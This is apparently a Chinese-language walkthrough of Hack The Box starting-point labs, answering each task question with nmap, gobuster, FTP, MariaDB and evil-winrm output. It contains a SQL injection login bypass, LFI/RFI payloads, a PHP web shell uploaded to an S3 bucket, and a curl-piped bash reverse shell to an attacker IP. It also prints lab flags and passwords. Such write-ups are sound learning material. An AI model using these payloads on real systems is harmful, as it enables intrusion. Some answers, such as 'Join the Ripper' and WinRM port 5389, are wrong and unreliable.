# Appointment

## task1

What does the acronym SQL stand for?

SQL的全称是什么

Structured Query Language

## task2

What is one of the most common type of SQL vulnerabilities?

最常见的SQL漏洞类型是什么？

SQL Injection

## task3

What does PII stand for?

PII代表什么

personally identifiable information

个人验证信息（PII，personally identifiable information）是有关一个人的任何数据，这些数据能帮助识别这个人，如姓名、指纹或其他生物特征资料、[电子邮件地址](https://baike.baidu.com/item/电子邮件地址/2284738)、电话号码或社会安全号码。

## task4

What does the OWASP Top 10 list name the classification for this vulnerability? 

结合上下文，应该是sql注入被OWASP Top 10分类成什么

![img](assets/774ae22e871f4264a7fb2e8da887d429.png)

## task 5

What service and version are running on port 80 of the target?

80端口上的服务和版本

仍然使用`namp -p 80 -sV `

​	Apache httpd 2.4.38 ((Debian))

## task 6

What is the standard port used for the HTTPS protocol?

HTTPS协议使用的标准(默认)端口是什么？

443

## task 7

What is one luck-based method of exploiting login pages?

利用运气登陆页面的方法？暴力破解？

brute-forcing

## task8

 What is a folder called in web-application terminology?

web应用术语中文件夹的名称是什么？

directory

## task9

What response code is given for "Not Found" errors?

not found 的响应代码是多少？

404是人都知道

## task10

What switch do we use with Gobuster to specify we're looking to discover directories, and not subdomains?

看题目就知道是问Gobuster工具哪个选项是用于发现目录而不是子域名，gobuster -h看一下帮助即可,不过kali Linux版本没有默认安装，只需要

`apt install gobuster`

``` powershell
┌──(root㉿kali)-[~]
└─# gobuster -h
Usage:
  gobuster [command]

Available Commands:
  completion  Generate the autocompletion script for the specified shell
  dir         Uses directory/file enumeration mode
  dns         Uses DNS subdomain enumeration mode
  fuzz        Uses fuzzing mode. Replaces the keyword FUZZ in the URL, Headers and the request body
  gcs         Uses gcs bucket enumeration mode
  help        Help about any command
  s3          Uses aws bucket enumeration mode
  version     shows the current version
  vhost       Uses VHOST enumeration mode (you most probably want to use the IP address as the URL parameter)

```

可以发现是`dir`

## task11

What symbol do we use to comment out parts of the code?

注释符号

`#`

## task12

靶机开放了80端口的HTTPS服务，访问IP地址发现是个登录页面，用户名存在SQL注入，用户名输入`admin' or 1=1#`，密码随便输一个就能成功登录拿到FLAG

# Sequel

## task1

What does the acronym SQL stand for?

又来？

Structuered Query Language

## task 2

During our scan, which port running mysql do we find?

还是nmap扫描

```powershell
┌──(root㉿kali)-[~]
└─# nmap -sS 10.129.90.221
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-26 06:33 EST
Nmap scan report for 10.129.90.221
Host is up (1.1s latency).
Not shown: 999 closed tcp ports (reset)
PORT     STATE SERVICE
3306/tcp open  mysql

```

可以看到是3306

## task 3

What community-developed MySQL version is the target running?

版本?

MariaDB

## task 4

What switch do we need to use in order to specify a login username for the MySQL service?

`-u`也就是user

## task 5

 Which username allows us to log into MariaDB without providing a password?

思路已经很明显了，那就直接用root尝试登陆MariaDB,发现确实不用密码即可进入数据库

```powershell
┌──(root㉿kali)-[~]
└─# mysql -u root -h 10.129.90.221
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 83
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> Ctrl-C -- exit!
Aborted
```

## task 6

What symbol can we use to specify within the query that we want to display eveything inside a table?

我们可以使用什么符号在查询中指定要显示表中的所有内容？

`*`

 ## task 7

What symbol do we need to end each query with?

每句话结束结束记得加`；`

## task 8

进入数据库发现有个叫htb的数据库，进去有两张表，发现flag就藏在config里

```powershell
Database changed
MariaDB [htb]> use htb;
Database changed
MariaDB [htb]> show tables;
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
2 rows in set (0.604 sec)

MariaDB [htb]> select * from config
    -> ;
+----+-----------------------+----------------------------------+
| id | name                  | value                            |
+----+-----------------------+----------------------------------+
|  1 | timeout               | 60s                              |
|  2 | security              | default                          |
|  3 | auto_logon            | false                            |
|  4 | max_size              | 2M                               |
|  5 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |
|  6 | enable_uploads        | false                            |
|  7 | authentication_method | radius                           |
+----+-----------------------+----------------------------------+
7 rows in set (0.304 sec)
```

# Crocodile

## task1

What nmap scanning switch employs the use of default scripts during a scan?

首先问nmap工具的什么选项是用默认脚本进行扫描，很简单，nmap -h查看帮助信息即可得到答案

为-sC

```powershell
SCRIPT SCAN:
  -sC: equivalent to --script=default
  --script=<Lua scripts>: <Lua scripts> is a comma separated list of
           directories, script-files or script-categories
  --script-args=<n1=v1,[n2=v2,...]>: provide arguments to scripts
  --script-args-file=filename: provide NSE script args in a file
  --script-trace: Show all data sent and received
  --script-updatedb: Update the script database.
  --script-help=<Lua scripts>: Show help about scripts.
           <Lua scripts> is a comma-separated list of script-files or
           script-categories.

```

## task2

 What service version is found to be running on port 21?

```powershell
┌──(root㉿kali)-[~]
└─# nmap -sV 10.129.132.176             
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-26 07:06 EST
Nmap scan report for 10.129.132.176
Host is up (4.3s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Unix

```

## task 3

What FTP code is returned to us for the "Anonymous FTP login allowed" message?

返回什么FTP代码表示允许匿名登录FTP，试一下



```powershell
┌──(root㉿kali)-[~]
└─# ftp 10.129.132.176
Connected to 10.129.132.176.
220 (vsFTPd 3.0.3)
Name (10.129.132.176:root): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```

## task 4

What command can we use to download the files we find on the FTP server?

`get`

## task 5

 What is one of the higher-privilege sounding usernames in the list we retrieved?

检索列表中，哪个用户的权限看起来更高

用命令获得FTP服务器的名称，并查看下载下来的allowed.userlist文件

```powershell
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
226 Directory send OK.
ftp> get allowed.userlist
local: allowed.userlist remote: allowed.userlist
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for allowed.userlist (33 bytes).
226 Transfer complete.
33 bytes received in 0.00 secs (203.9656 kB/s)
ftp> get allowed.userlist.passwd
local: allowed.userlist.passwd remote: allowed.userlist.passwd
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for allowed.userlist.passwd (62 bytes).
226 Transfer complete.
62 bytes received in 0.00 secs (197.2211 kB/s)
ftp> quit
221 Goodbye.

┌──(root💀kali)-[~]
└─# cat allowed.userlist
aron
pwnmeow
egotisticalsw
admin

┌──(root💀kali)-[~]
└─# cat allowed.userlist.passwd
root
Supersecretpassword1
@BaASD&9032123sADS
rKXM59ESxesUFHAd
```

得到答案admin

## task 6

What version of Apache HTTP Server is running on the target host?

task2可知为 `2.4.41`

## task7

What is the name of a handy web site analysis plug-in we can install in our browser?

一个方便的网站分析插件的名字是什么，我们可以安装在我们的浏览器?

Wappalyzer是一个信息收集工具，主要用于对网站所用的组件进行分析。

## task 8

 What switch can we use with gobuster to specify we are looking for specific filetypes?

利用gobuster dir -h命令，看什么选项支持查找特定的文件类型。

```powershell
gobuster dir --help
Uses directory/file enumeration mode

Usage:
  gobuster dir [flags]

Flags:
  -f, --add-slash                       Append / to each request
  -c, --cookies string                  Cookies to use for the requests
  -d, --discover-backup                 Upon finding a file search for backup files
      --exclude-length ints             exclude the following content length (completely ignores the status). Supply multiple times to exclude multiple sizes.
  -e, --expanded                        Expanded mode, print full URLs
  -x, --extensions string               File extension(s) to search for
  -r, --follow-redirect                 Follow redirects
  -H, --headers stringArray             Specify HTTP headers, -H 'Header1: val1' -H 'Header2: val2'
  -h, --help                            help for dir
      --hide-length                     Hide the length of the body in the output
  -m, --method string                   Use the following HTTP method (default "GET")
  -n, --no-status                       Don't print status codes
  -k, --no-tls-validation               Skip TLS certificate verification
  -P, --password string                 Password for Basic Auth
      --proxy string                    Proxy to use for requests [http(s)://host:port]
      --random-agent                    Use a random User-Agent string
  -s, --status-codes string             Positive status codes (will be overwritten with status-codes-blacklist if set)
  -b, --status-codes-blacklist string   Negative status codes (will override status-codes if set) (default "404")
      --timeout duration                HTTP Timeout (default 10s)
  -u, --url string                      The target URL
  -a, --useragent string                Set the User-Agent string (default "gobuster/3.1.0")
  -U, --username string                 Username for Basic Auth
```

可以看到 -x是查找指定文件类型

## task 9，10

What file have we found that can provide us a foothold on the target?

`gobuster dir --url 10.129.132.176 -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -x .php`

发现存在登录后台login.php,再打开网页，结合之前FTP下载的用户和密码进行登录

使用admin 和rKXM59ESxesUFHAd进入后台

![image-20221126210956921](assets/image-20221126210956921.png)

# Responder

## task1

When visiting the web service using the IP address, what is the domain that we are being redirected to? 

当使用IP地址访问web服务时，我们要重定向到的域是什么？

![image-20221126211806975](assets/image-20221126211806975.png)

## task2 

Which scripting language is being used on the server to generate webpages?

服务器上使用哪种脚本语言生成网页？



`php`

> 域名解析有两种，一种是本地系统中的hosts文件来解析，一种是通过dns服务器来解析。一般我们用的是dns服务器，因为dns服务器数据库中存储了大量的IP与域名对应的相关数据。dns服务器我们肯定是动不了的，而windows中的hosts文件的存在给了我们一种新选择，我们可以通过修改hosts文件来实现我们对域名解析的自定义操作。同理，Linux下也有hosts文件只需将对应的IP地址和域名对应填入这个文件便能成功解析到正确网页。

> 需要明白hosts优先级高于dns域名解析服务器

![image-20221127122050797](assets/image-20221127122050797.png)

## task 3

What is the name of the URL parameter which is used to load different language versions of the webpage? 

用于加载网页的不同语言版本的URL参数的名称是什么？

![image-20221127124215252](assets/image-20221127124215252.png)

`page`

## task 4

Which of the following values for the `page` parameter would be an example of exploiting a Local File Include (LFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe" 

下面哪个选项可以作为page的参数来进行本地文件包含(LFI)。

## task 5

Which of the following values for the `page` parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe" 

下面哪个选项可以作为page的参数来进行远程文件包含（RFI）

## task 6

What does NTLM stand for? 

> New Technology LAN ManagerNTLM是NT LAN [Manager](https://baike.baidu.com/item/Manager/16016780?fromModule=lemma_inlink)的缩写，这也说明了协议的来源。NTLM是指 [telnet](https://baike.baidu.com/item/telnet/810597?fromModule=lemma_inlink) 的一种验证身份方式，即问询/应答[身份验证](https://baike.baidu.com/item/身份验证/2193233?fromModule=lemma_inlink)协议，是 Windows NT 早期版本的标准安全协议，[Windows 2000](https://baike.baidu.com/item/Windows 2000/2769068?fromModule=lemma_inlink) 支持 NTLM 是为了保持[向后兼容](https://baike.baidu.com/item/向后兼容/94553?fromModule=lemma_inlink)。Windows 2000内置三种基本安全协议之一。

## task 7

Which flag do we use in the Responder utility to specify the network interface?

我们在响应responder程序实用程序中使用哪个标志来指定网络接口？

`-I`

```powershell
──(root㉿kali)-[~]
└─# responder -h              
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

Usage: responder -I eth0 -w -d
or:
responder -I eth0 -wd

Options:
  --version             show program's version number and exit
  -h, --help            show this help message and exit
  -A, --analyze         Analyze mode. This option allows you to see NBT-NS,
                        BROWSER, LLMNR requests without responding.
  -I eth0, --interface=eth0
                        Network interface to use, you can use 'ALL' as a
                        wildcard for all interfaces
  -i 10.0.0.21, --ip=10.0.0.21
                        Local IP to use (only for OSX)
  -6 2002:c0a8:f7:1:3ba8:aceb:b1a9:81ed, --externalip6=2002:c0a8:f7:1:3ba8:aceb:b1a9:81ed
                        Poison all requests with another IPv6 address than
                        Responder's one.
  -e 10.0.0.22, --externalip=10.0.0.22
                        Poison all requests with another IP address than
                        Responder's one.
  -b, --basic           Return a Basic HTTP authentication. Default: NTLM
  -d, --DHCP            Enable answers for DHCP broadcast requests. This
                        option will inject a WPAD server in the DHCP response.
                        Default: False
  -D, --DHCP-DNS        This option will inject a DNS server in the DHCP
                        response, otherwise a WPAD server will be added.
                        Default: False
  -w, --wpad            Start the WPAD rogue proxy server. Default value is
                        False
  -u UPSTREAM_PROXY, --upstream-proxy=UPSTREAM_PROXY
                        Upstream HTTP proxy used by the rogue WPAD Proxy for
                        outgoing requests (format: host:port)
  -F, --ForceWpadAuth   Force NTLM/Basic authentication on wpad.dat file
                        retrieval. This may cause a login prompt. Default:
                        False
  -P, --ProxyAuth       Force NTLM (transparently)/Basic (prompt)
                        authentication for the proxy. WPAD doesn't need to be
                        ON. This option is highly effective. Default: False
  --lm                  Force LM hashing downgrade for Windows XP/2003 and
                        earlier. Default: False
  --disable-ess         Force ESS downgrade. Default: False
  -v, --verbose         Increase verbosity.

```

## task 8

There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as john, but the full name is what?.

有几种工具可以接受NetNTLMv2挑战/响应，并尝试数百万个密码，以查看其中是否有任何一个生成相同的响应。其中一个工具通常被称为“john”，但全名是什么？。

`Join the Ripper`

## task 9

What is the password for the administrator user?

管理员用户的密码是什么？

`badminton`



## task 10

We'll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on?

我们将使用Windows服务（即box上运行）使用我们恢复的密码远程访问响应程序计算机。它侦听哪个端口TCP？

`5389`

## task 11

使用evil-winrm连接

```powershell
┌──(root㉿kali)-[~]
└─# evil-winrm -i 10.129.124.232 -u Administrator -p  badminton

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                             

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                               

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> ls
*Evil-WinRM* PS C:\Users\Administrator\Documents> dir
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd /
*Evil-WinRM* PS C:\> dir


    Directory: C:\


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         12/7/2019   1:14 AM                PerfLogs
d-r---          4/1/2022   1:07 PM                Program Files
d-r---         8/24/2021   5:02 PM                Program Files (x86)
d-r---          3/9/2022   5:33 PM                Users
d-----          4/1/2022   1:00 PM                Windows
d-----          3/9/2022   5:29 PM                xampp


*Evil-WinRM* PS C:\> cd Users\mike\Desktop
*Evil-WinRM* PS C:\Users\mike\Desktop> dir


    Directory: C:\Users\mike\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         3/10/2022   4:50 AM             32 flag.txt


*Evil-WinRM* PS C:\Users\mike\Desktop> cat flag.txt
ea81b7afddd03efaa0945333ed147fac
*Evil-WinRM* PS C:\Users\mike\Desktop> 

```

# Three

## task 1

​	How many TCP ports are open?

​	打开了多少个TCP端口？

 还`nmap -sV` 看到有两个

```powershell
                                                                                          
┌──(root㉿kali)-[~]
└─# nmap -sV 10.129.93.13  
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-27 01:24 EST
Nmap scan report for 10.129.93.13
Host is up (1.2s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.03 seconds
```

## task2

What is the domain of the email address provided in the "Contact" section of the website?

网站“联系人”部分中提供的电子邮件地址的域是什么？

`thetoppers.htb`

![image-20221127143050932](assets/image-20221127143050932.png)

## task 3

In the absence of a DNS server, which Linux file can we use to resolve hostnames to IP addresses in order to be able to access the websites that point to those hostnames? 

在没有DNS服务器的情况下，我们可以使用哪个Linux文件将主机名解析为IP地址，以便能够访问指向这些主机名的网站？

`/etc/hosts`

## task 4

Which sub-domain is discovered during further enumeration?

在进一步枚举期间发现了哪个子域？

看到好像又要用gobuster，只能详细看看怎么用

> **子域名/目录暴力工具Gobuster**
>
> Gobuster是Kali Linux默认安装的一款暴力扫描工具。它是使用Go语言编写的命令行工具，具备优异的执行效率和并发性能。该工具支持对子域名和Web目录进行基于字典的暴力扫描。不同于其他工具，该工具支持同时多扩展名破解，适合采用多种后台技术的网站。实施子域名扫描时，该工具支持泛域名扫描，并允许用户强制继续扫描，以应对泛域名解析带来的影响。

```powershell
-P string：基本AUTH的密码（仅为DIR模式）
-U string：基本AUTH的用户名（仅为DIR模式）
-a string：设置用户代理字符串（DIR模式）
-c string：用于请求的Cookie（仅为DIR模式）
-cn：显示CNNEX记录（DNS模式），不能与“-I”选项一起使用）
-e：扩展模式，打印完整URL
-f：向每个目录请求追加前斜线（仅为DIR模式）
-fw：当通配符发现时，强制继续操作
-i：显示IP地址（仅DNS模式）
-k：跳过SSL证书验证
-l：包括在输出中的主体长度（仅为DIR模式）
-m string：目录/文件模式（DIR）或DNS模式（DNS）（默认“DIR”）
-n：不要打印状态代码
-np：不显示进度
-o string：输出文件以写入结果（默认为STDUT）
-p string：用于请求的代理[http(s)://主机:端口]（仅dir模式）
-q：不要打印横幅和其他噪音
-r：追随重定向
-s string：设置状态码（DIR模式）（默认"200,204,301,302,307,403"）
-t int：并发线程数（默认值10）
-to duration：HTTP超时（仅限于DIR模式）（默认10s）
-u string：目标URL或域
-v：冗长输出（错误）
-w string：暴力猜解的单词列表的路径
-x string：要搜索的文件扩展（仅限于DIR模式）
```



![image-20221127173108388](assets/image-20221127173108388.png)

thetoppers.htb应该是域名，把域名和IP加到hosts文件中，tee命令的作用就是读取标准输入内容，将读取到的内容数据写入到标准输出和文件中

`echo "10.129.126.35 thetoppers.htb" | tee -a /etc/hosts`

再次访问和之前页面一样，尝试子域名爆破，有没有其他突破口

`gobuster vhost -w /usr/share/wordlists/dict/subnames.txt -u http://thetoppers.htb`

这里使用kali自带的字典跑巨久，就假装跑出来了发现子域名是

`s3.thetoppers.htb`

那就再改，把hosts文件中刚刚添加的这个域名再加一个`s3.`

`echo "10.129.126.35 s3.thetoppers.htb" | tee -a /etc/hosts`

## task 5

Which service is running on the discovered sub-domain?

哪个服务正在发现的子域上运行？

访问这个`s3.thetoppers.htb`这个网址发现里面是一条json数据

![image-20221127190708169](assets/image-20221127190708169.png)



看看s3，s3是亚马逊[云存储](https://so.csdn.net/so/search?q=云存储&spm=1001.2101.3001.7020)的简单存储服务，全程是Simple Storage Service。（说实话我也不知道s3是啥，看别人是这么说的，那就暂时跟着走吧）

所以答案是`Amazon S3`

## task 6

Which command line utility can be used to interact with the service running on the discovered sub-domain?

哪个命令行实用程序可用于与在发现的子域上运行的服务交互？

`awscli`

## task 7

Which command is used to set up the AWS CLI installation?

哪个命令用于设置AWS CLI安装？

`aws configure`

## task 8

​	What is the command used by the above utility to list all of the S3 buckets?

上述实用程序用于列出所有S3存储桶的命令是什么？

`aws s3 ls`

## task 9

This server is configured to run files written in what web scripting language?

此服务器配置为运行用什么web脚本语言编写的文件？

`php`

## task 10

我们就可以通过awscli来与s3进行交互，安装并将所有字段随意配置(服务器可能不校验)。

```poweshell
┌──(root㉿kali)-[/home/kali]
└─# aws configure                                                       
AWS Access Key ID [****************1]: AKIAIOSFODNN7EXAMPLE
AWS Secret Access Key [****************1]: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
Default region name [1]: us-west-2
Default output format [1]: json
```

列出该s3下的目录及对象

```powershell
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
```

创建一句话木马

```powershell
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

使用cp命令拷贝到s3的桶里

```powershell
┌──(root㉿kali)-[/home/kali]
└─# aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
upload: ./shell.php to s3://thetoppers.htb/shell.php
```

在浏览器中访问`http://thetoppers.htb/shell.php?cmd=ls`

可以看到其中有`images` 和`index.php `和我们刚刚上传的的`shell.php`

![img](assets/6558.png)

我们通过命令执行shell，curl执行bash脚本反弹shell来实现命令行交互。查看本机ip

ifconfig //10.10.16.90

生成bash一句话shell.sh

![img](assets/6578.png)

`\#!/bin/bash`

`bash -i >& /dev/tcp/10.10.16.90/1337 0>&1`

nc监听端口

`nc -nvlp 1337`

python创建简易服务器

`python3 -m http.server 8090`

目标机curl本机bash文件并执行

`http://thetoppers.htb/shell.php?cmd=curl%2010.10.16.90:8090/shell.sh%20|%20bash`

浏览器访问：http://thetoppers.htb/shell.php?cmd=curl 10.10.16.90:8090/shell.sh | bash

```powershell
┌──(root㉿kali)-[/home/kali]
└─# nc -nvlp 1337
listening on [any] 1337 ...
connect to [10.10.16.90] from (UNKNOWN) [10.129.82.250] 41074
bash: cannot set terminal process group (1391): Inappropriate ioctl for device
bash: no job control in this shell
www-data@three:/var/www/html$ ls
ls
images
index.php
shell.php
www-data@three:/var/www/html$ cd ../
cd ../
www-data@three:/var/www$ ls
ls
flag.txt
html
www-data@three:/var/www$ cat flag.txt
cat flag.txt
a980d99281a28d638ac68b9bf9453c2b
www-data@three:/var/www$
```



> cURL 是一个网络数据传输项目，通常说 cURL 是指 curl 命令行工具，它支持 DICT、FILE、FTP、FTPS、Gopher、HTTP、HTTPS、IMAP、IMAPS、LDAP、LDAPS、POP3、POP3S、RTMP、RTSP、SCP、SFTP、SMB、SMBS、SMTP、SMTPS、Telnet 与 TFTP 等协议，而 curl 的底层使用的是 libcurl 库，libcurl 与 curl 组成了 cURL 项目。

> ## nc命令用法举例
>
> 什么是nc
> nc是netcat的简写，有着网络界的瑞士军刀美誉。因为它短小精悍、功能实用，被设计为一个简单、可靠的网络工具
>
> ## nc的作用
>
> （1）实现任意TCP/[UDP](https://so.csdn.net/so/search?q=UDP&spm=1001.2101.3001.7020)端口的侦听，nc可以作为server以TCP或UDP方式侦听指定端口
> （2）端口的扫描，nc可以作为client发起TCP或UDP连接
> （3）机器之间传输文件
> （4）机器之间网络测速
> nc的控制参数不少，常用的几个参数如下所列：
>
> 1. **-l**
>    用于指定nc将处于侦听模式。指定该参数，则意味着nc被当作server，侦听并接受连接，而非向其它地址发起连接。
> 2. **-p <por/t/>**
>    暂未用到（老版本的nc可能需要在端口号前加-p参数，下面测试环境是centos6.6，nc版本是nc-1.84，未用到-p参数）
> 3. **-s**
>    指定发送数据的源IP地址，适用于多网卡机
> 4. **-u**
>    指定nc使用UDP协议，默认为TCP
> 5. **-v**
>    输出交互或出错信息，新手调试时尤为有用
> 6. **-w**
>    超时秒数，后面跟数字
> 7. **-z**
>    表示zero，表示扫描时不发送任何数据

